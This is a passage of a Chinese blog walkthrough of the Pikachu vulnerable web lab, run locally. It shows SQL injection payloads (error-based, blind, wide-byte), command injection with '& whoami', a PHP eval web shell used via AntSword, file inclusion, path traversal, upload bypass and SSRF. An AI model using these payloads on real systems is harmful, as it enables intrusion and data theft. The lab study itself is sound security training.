<li><p>Accept: 指定客户端能够接收的数据类型，例如text&#x2F;html、image&#x2F;jpeg等。</p>
</li>
<li><p>Accept-Encoding: 指定客户端能够接受的编码方式，例如gzip、deflate等。</p>
</li>
<li><p>Accept-Language: 指定客户端接受的语言类型，例如en-US，zh-CN等。</p>
</li>
<li><p>Connection: 指定客户端与服务器的连接类型，例如keep-alive、close等。</p>
</li>
<li><p>Host: 指定请求的服务器的域名和端口号。</p>
</li>
<li><p>User-Agent: 指定客户端使用的浏览器类型及版本号。</p>
</li>
</ol>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163203127.png" alt="image-20230806163203127"></p>
<p>后台语句</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163236950.png" alt="image-20230806163236950"></p>
<p>构造闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1)--&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806164734474.png" alt="image-20230806164734474"></p>
<h3 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h3><p>布尔盲注就是猜测，根据页面返回的true和flase猜数据库总数，猜数据库长度，猜数据库名字，猜表和字段</p>
<p>输入<code>kobe</code>用户存在，而输入<code>66</code>用户不存在，判断可能存在布尔盲注</p>
<p>我们可以猜与数据库的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and length(database())=6# </span><br><span class="line">kobe&#x27; and length(database())=7# </span><br></pre></td></tr></table></figure>

<p>当长度等于6时，提示用户不存在，等于7时，正确返回数据，说明数据库长度为7</p>
<p>我们再用burp爆破数据库的名称，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">substr()是截取字符串的函数</span><br></pre></td></tr></table></figure>

<p>发送到爆破模块，设置位置</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171336783.png" alt="image-20230806171336783"></p>
<p>第一个位置</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171418469.png" alt="image-20230806171418469"></p>
<p>第二个位置</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171440400.png" alt="image-20230806171440400"></p>
<p>按照顺序拼写出pikachu</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171519438.png" alt="image-20230806171519438"></p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>后台语句</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171713131.png" alt="image-20230806171713131"></p>
<p>利用sleep()函数和返回时间进行判断是否存在时间盲注</p>
<p>正常输入，反应时间时15毫秒</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172038838.png" alt="image-20230806172038838"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())&gt;1,sleep(6),1)#</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172325802.png" alt="image-20230806172325802"></p>
<p>花费了6秒，证明可能存在时间盲注</p>
<p>可判断数据库长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())&gt;6,sleep(6),1)# //执行了函数，延迟了6秒</span><br><span class="line">kobe&#x27; and if(length(database())&gt;7,sleep(6),1)# //没有执行延迟，证明长度是7</span><br></pre></td></tr></table></figure>

<p>还可爆破数据库名称,跟布尔盲注是一样操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1)#</span><br></pre></td></tr></table></figure>

<h3 id="宽字节注入-wide-byte注入"><a href="#宽字节注入-wide-byte注入" class="headerlink" title="宽字节注入(wide byte注入)"></a>宽字节注入(wide byte注入)</h3><p>一个字节的字符叫做窄字节，两个字节及以上叫宽字节</p>
<p>宽字节注入是绕过sql防御的一种方法，为了防御sql注入，一些函数可以将单引号、双引号进行转义，转义就是再单引号、双引号前面加上转义字符（\）。</p>
<p>mysql使用的是GBK编码（两个字节），<code>\</code>的十六进制编码是%5c，前面加%df就可以组成一个繁体字<code>運</code></p>
<p>过程：</p>
<p>id&#x3D;1%df’（浏览器自动进行url编码%27）-&gt;%df%27<br> 根据以上分析，发生如下转换：<br> %df%27—&gt;(check_addslashes)—&gt;%df%5c%27—-&gt;(GBK)—-&gt;運</p>
<p>最后单引号形成闭合</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1# //回显所有信息</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806174819990.png" alt="image-20230806174819990"></p>
<p>接着还可以判断字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; order by 2 //无报错</span><br><span class="line">kobe%df&#x27; order by 3 //有报错</span><br></pre></td></tr></table></figure>

<p>联合查询进行查询数据库和版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; union select database(),version() #</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806175239286.png" alt="image-20230806175239286"></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
<h3 id="exec“ping”"><a href="#exec“ping”" class="headerlink" title="exec“ping”"></a>exec“ping”</h3><p>给了一个ping的框</p>
<p>尝试ping</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; whoami //两条命令都可以执行</span><br></pre></td></tr></table></figure>

<p>同时执行多条命令的语法格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a &amp; b   //先执行a再执行b，无论a是否执行成功(按位与)</span><br><span class="line">a &amp;&amp; b  //先执行a再执行b，只有a执行成功才会执行b(逻辑与)</span><br><span class="line">a || b  //先执行a再执行b，只有a执行失败才会执行b(逻辑或)</span><br><span class="line">a | b   //将a的执行结果传递给b(管道符)</span><br></pre></td></tr></table></figure>

<h3 id="exec“evel”"><a href="#exec“evel”" class="headerlink" title="exec“evel”"></a>exec“evel”</h3><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p>可以输入<code>phpinfo();</code></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806212321142.png" alt="image-20230806212321142"></p>
<p>后端代码是直接可以执行的</p>
<p><code>eval($_POST[&#39;txt&#39;]</code>也算是一句话木马，我们可以通过蚁剑进行连接</p>
<p>这时候提示数据为空，是因为还有参数没有进行提交</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213006470.png" alt="image-20230806213006470"></p>
<p>我们添加一下</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213211985.png" alt="image-20230806213211985"></p>
<p>连接成功</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213233214.png" alt="image-20230806213233214"></p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>首先，需要将服务器文件包含功能打开</p>
<p><img src="C:/Users/86188/AppData/Roaming/Typora/typora-user-images/image-20230812153713038.png" alt="image-20230812153713038"></p>
<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>只能够对服务器本地的文件进行包含，攻击者大多会读取系统配置文件等</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812152856968.png" alt="image-20230812152856968"></p>
<p>通过目录遍历可以读取本地文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153029599.png" alt="image-20230812153029599"></p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>可以通过url地址对远程的文件进行包含</p>
<p>php中有几个文件包含函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(),include_once()</span><br><span class="line">require(),require_once()</span><br></pre></td></tr></table></figure>

<p>可以在url中输入网址</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153935437.png" alt="image-20230812153935437"></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153959732.png" alt="image-20230812153959732"></p>
<p>还可以通过url的形式读取文件</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154125229.png" alt="image-20230812154125229"></p>
<h2 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h2><p>这是下载文件的url</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154349392.png" alt="image-20230812154349392"></p>
<p>如果后端没有进行文件名过滤，我们可以直接再filename下载服务器上的任意文件，通过目录遍历。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../1.txt</span><br></pre></td></tr></table></figure>

<h2 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h2><h3 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154954700.png" alt="image-20230812154954700"></p>
<p>查看源码</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812155401123.png" alt="image-20230812155401123"></p>
<p>发现是前端校验，我们可以禁用js，然后就可以上传.php的文件</p>
<p>还可以利用抓包改后缀名</p>
<h3 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h3><p>我们可以上传图片，Content-Type: image&#x2F;png</p>
<p>只需要将后缀名修改成php就行了。也可以上传php文件进行抓包，修改Content-Type。</p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>getimagesize()：它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。</p>
<p>我们可以伪造文件头</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812163754016.png" alt="image-20230812163754016"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作， 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。                </p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>用户本身可以修改别的用户的信息</p>
<p>url中的username是lucy，我们可以修改成lili</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164129473.png" alt="image-20230812164129473"></p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164311056.png" alt="image-20230812164311056"></p>
<p>直接跳转到lili的页面，这叫做水平越权</p>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>用户可以拥有管理员的权限，对用户信息进行添加</p>
<p>我们先登管理员账号，得到添加信息的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>

<p>然后退出管理员账号，登录用户账号，访问这个url，依旧可以进行添加用户，这叫垂直越权。</p>
<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/pikachu/vul/urlredirect/urlredirect.php?url=</span><br></pre></td></tr></table></figure>

<p>可以在参数后面直接输入网站进行跳转</p>
<p>url跳转的危害：</p>
<p>钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站。</p>
<h2 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF(服务器端请求伪造)"></a>SSRF(服务器端请求伪造)</h2><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>查看源码，利用的是curl_exec()函数</p>
<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813172942275.png" alt="image-20230813172942275"></p>
<h3 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173249389.png" alt="image-20230813173249389"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173410632.png" alt="image-20230813173410632"></p>
<p>利用伪协议进行读取文件内容</p>
<h2 id="XXE-xml外部实体注入"><a href="#XXE-xml外部实体注入" class="headerlink" title="XXE(xml外部实体注入)"></a>XXE(xml外部实体注入)</h2><p>xml是可扩展标记语言</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; //声明是xml</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt; //外部实体声明</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt; Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt; Reminder &lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<p>判断是否有xxe回显漏洞</p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;aa&gt;aa&lt;/aa&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813180132480.png" alt="image-20230813180132480"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://dabai5269.top">大白</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dabai5269.top/post/ecb6de2c.html">https://dabai5269.top/post/ecb6de2c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dabai5269.top" target="_blank">大白</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-nrqmmm.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/6c198c6.html"><img class="next-cover" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-85kxlk.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">preg_match绕过和神奇的unicode编码</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/b3432909.html" title="sqli-labs"><img class="cover" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-rryqkj.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-22</div><div class="title">sqli-labs</div></div></a></div><div><a href="/post/80f02bc5.html" title="upload-labs"><img class="cover" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-85kxlk.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-07</div><div class="title">upload-labs</div></div></a></div><div><a href="/post/5f593b8b.html" title="搭建靶场"><img class="cover" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/wallhaven-yx8z2g.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-11</div><div class="title">搭建靶场</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">大白</div><div class="author-info__description">大白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://ys.mihoyo.com/"><i class="iconfont icon-youxishoubing"></i><span>摸鱼</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xuxu0919" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_74039266?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1924085269&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:1924085269@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">小白一个</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople1.js"></script><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/zdog.dist.js"></script><script id="rendered-js" src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-number">1.2.</span> <span class="toc-text">验证码绕过(on server)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%8C%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理，源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client"><span class="toc-number">1.3.</span> <span class="toc-text">验证码绕过(on client)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.</span> <span class="toc-text">token防爆破?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss"><span class="toc-number">2.</span> <span class="toc-text">跨站脚本攻击(xss)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-get"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-post"><span class="toc-number">2.2.</span> <span class="toc-text">反射型XSS(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.3.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.4.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">2.5.</span> <span class="toc-text">DOM型xss-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9B%B2%E6%89%93"><span class="toc-number">2.6.</span> <span class="toc-text">XSS盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.</span> <span class="toc-text">XSS之过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhtmlspecialchars-%E5%87%BD%E6%95%B0"><span class="toc-number">2.8.</span> <span class="toc-text">xss之htmlspecialchars()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA%E5%92%8Cjs%E8%BE%93%E5%87%BA"><span class="toc-number">2.9.</span> <span class="toc-text">xss之href输出和js输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.10.</span> <span class="toc-text">xss的危害</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">2.10.1.</span> <span class="toc-text">获取cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E8%8E%B7%E5%8F%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.10.2.</span> <span class="toc-text">钓鱼获取账户密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">2.10.3.</span> <span class="toc-text">获取键盘记录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">CSRF(跨站请求伪造)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-get-x2F-post"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF(get&#x2F;post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF(Token)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert-x2F-update%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">insert&#x2F;update注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-header-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">http header 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.8.</span> <span class="toc-text">基于boolian的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.9.</span> <span class="toc-text">基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-wide-byte%E6%B3%A8%E5%85%A5"><span class="toc-number">4.10.</span> <span class="toc-text">宽字节注入(wide byte注入)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec%E2%80%9Cping%E2%80%9D"><span class="toc-number">5.1.</span> <span class="toc-text">exec“ping”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec%E2%80%9Cevel%E2%80%9D"><span class="toc-number">5.2.</span> <span class="toc-text">exec“evel”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">7.</span> <span class="toc-text">不安全的文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">8.</span> <span class="toc-text">不安全的文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 